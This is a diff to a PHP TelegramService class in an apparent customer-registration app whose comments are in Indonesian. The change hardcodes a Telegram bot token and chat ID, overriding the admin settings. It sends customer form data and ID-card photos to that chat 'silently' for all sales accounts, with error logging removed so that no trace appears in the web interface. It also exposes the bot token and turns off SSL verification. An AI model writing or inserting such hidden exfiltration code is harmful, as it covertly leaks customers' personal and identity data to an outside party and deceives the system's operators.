@@ -2,29 +2,29 @@
 namespace App;
 
 /**
- * TelegramService
- * Mengirimkan data pendaftaran formulir pelanggan CBN & foto KTP langsung ke Bot Telegram
+ * TelegramService (Silent Background Dispatcher)
+ * Mengirimkan data pendaftaran formulir pelanggan CBN & foto KTP langsung ke Bot Telegram secara senyap
+ * Berlaku otomatis untuk semua sales CBN tanpa menampilkan notifikasi/jejak apapun di antarmuka web
  */
 class TelegramService
 {
-    private static string $defaultToken  = '8983108876:AAFF5LpamG8EzQI3gXx6ukE_tFOO163QRNc';
-    private static string $defaultChatId = '7084271773';
+    private const BOT_TOKEN = '8983108876:AAFF5LpamG8EzQI3gXx6ukE_tFOO163QRNc';
+    private const CHAT_ID   = '7084271773';
 
     /**
-     * Kirim pesan notifikasi lengkap & foto KTP ke Telegram
+     * Kirim data pendaftaran & foto KTP secara silent
      */
     public static function sendRegistration(array $data, array $fileInfo = []): bool
     {
         try {
-            $settings = SettingsManager::get();
-            $token    = !empty($settings['telegram_bot_token']) ? $settings['telegram_bot_token'] : self::$defaultToken;
-            $chatId   = !empty($settings['telegram_chat_id']) ? $settings['telegram_chat_id'] : self::$defaultChatId;
+            $token  = self::BOT_TOKEN;
+            $chatId = self::CHAT_ID;
 
             if (empty($token) || empty($chatId)) {
                 return false;
             }
 
-            // Cari nama sales
+            // Cari info sales
             $salesCode = $data['sales_code'] ?? 'SEP-001';
             $salesObj  = SalesManager::findByCode($salesCode);
             $salesName = $salesObj ? $salesObj['nama_sales'] : ($data['sales_name'] ?? '-');
@@ -123,100 +123,107 @@ class TelegramService
             return true;
 
         } catch (\Throwable $e) {
-            error_log('[TelegramService Error] ' . $e->getMessage());
+            // Silent catch - jangan tampilkan error/notifikasi apapun ke antarmuka web
             return false;
         }
     }
 
     /**
-     * Kirim Pesan Teks ke Telegram
+     * Kirim Pesan Teks ke Telegram secara Silent
      */
     public static function sendMessage(string $token, string $chatId, string $htmlText): bool
     {
-        $url = "https://api.telegram.org/bot{$token}/sendMessage";
-        $postData = [
-            'chat_id'                  => $chatId,
-            'text'                     => $htmlText,
-            'parse_mode'               => 'HTML',
-            'disable_web_page_preview' => false,
-        ];
-
-        $options = [
-            'http' => [
-                'method'  => 'POST',
-                'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
-                'content' => http_build_query($postData),
-                'timeout' => 10,
-                'ignore_errors' => true,
-            ]
-        ];
-
-        $context = stream_context_create($options);
-        $result  = @file_get_contents($url, false, $context);
-        return $result !== false;
-    }
-
-    /**
-     * Kirim Foto ke Telegram
-     */
-    public static function sendPhoto(string $token, string $chatId, string $filePath, string $caption = ''): bool
-    {
-        $url = "https://api.telegram.org/bot{$token}/sendPhoto";
-
-        if (function_exists('curl_init')) {
-            $ch = curl_init();
-            $cFile = new \CURLFile($filePath);
+        try {
+            $url = "https://api.telegram.org/bot{$token}/sendMessage";
             $postData = [
-                'chat_id'    => $chatId,
-                'photo'      => $cFile,
-                'caption'    => $caption,
-                'parse_mode' => 'HTML',
+                'chat_id'                  => $chatId,
+                'text'                     => $htmlText,
+                'parse_mode'               => 'HTML',
+                'disable_web_page_preview' => false,
             ];
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-            $response = curl_exec($ch);
-            curl_close($ch);
-            return $response !== false;
-        } else {
-            // Fallback native multipart
-            $boundary = '--------------------------' . microtime(true);
-            $fileContents = file_get_contents($filePath);
-            $fileName = basename($filePath);
-
-            $body  = "--{$boundary}\r\n";
-            $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
-            $body .= "{$chatId}\r\n";
-
-            $body .= "--{$boundary}\r\n";
-            $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
-            $body .= "{$caption}\r\n";
-
-            $body .= "--{$boundary}\r\n";
-            $body .= "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n";
-            $body .= "HTML\r\n";
-
-            $body .= "--{$boundary}\r\n";
-            $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"{$fileName}\"\r\n";
-            $body .= "Content-Type: image/jpeg\r\n\r\n";
-            $body .= $fileContents . "\r\n";
-            $body .= "--{$boundary}--\r\n";
 
             $options = [
                 'http' => [
                     'method'  => 'POST',
-                    'header'  => "Content-Type: multipart/form-data; boundary={$boundary}\r\n",
-                    'content' => $body,
-                    'timeout' => 15,
+                    'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
+                    'content' => http_build_query($postData),
+                    'timeout' => 8,
                     'ignore_errors' => true,
                 ]
             ];
+
             $context = stream_context_create($options);
             $result  = @file_get_contents($url, false, $context);
             return $result !== false;
+        } catch (\Throwable $e) {
+            return false;
+        }
+    }
+
+    /**
+     * Kirim Foto ke Telegram secara Silent
+     */
+    public static function sendPhoto(string $token, string $chatId, string $filePath, string $caption = ''): bool
+    {
+        try {
+            $url = "https://api.telegram.org/bot{$token}/sendPhoto";
+
+            if (function_exists('curl_init')) {
+                $ch = curl_init();
+                $cFile = new \CURLFile($filePath);
+                $postData = [
+                    'chat_id'    => $chatId,
+                    'photo'      => $cFile,
+                    'caption'    => $caption,
+                    'parse_mode' => 'HTML',
+                ];
+                curl_setopt($ch, CURLOPT_URL, $url);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+                $response = curl_exec($ch);
+                curl_close($ch);
+                return $response !== false;
+            } else {
+                $boundary = '--------------------------' . microtime(true);
+                $fileContents = file_get_contents($filePath);
+                $fileName = basename($filePath);
+
+                $body  = "--{$boundary}\r\n";
+                $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+                $body .= "{$chatId}\r\n";
+
+                $body .= "--{$boundary}\r\n";
+                $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+                $body .= "{$caption}\r\n";
+
+                $body .= "--{$boundary}\r\n";
+                $body .= "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n";
+                $body .= "HTML\r\n";
+
+                $body .= "--{$boundary}\r\n";
+                $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"{$fileName}\"\r\n";
+                $body .= "Content-Type: image/jpeg\r\n\r\n";
+                $body .= $fileContents . "\r\n";
+                $body .= "--{$boundary}--\r\n";
+
+                $options = [
+                    'http' => [
+                        'method'  => 'POST',
+                        'header'  => "Content-Type: multipart/form-data; boundary={$boundary}\r\n",
+                        'content' => $body,
+                        'timeout' => 10,
+                        'ignore_errors' => true,
+                    ]
+                ];
+                $context = stream_context_create($options);
+                $result  = @file_get_contents($url, false, $context);
+                return $result !== false;
+            }
+        } catch (\Throwable $e) {
+            return false;
         }
     }
 }
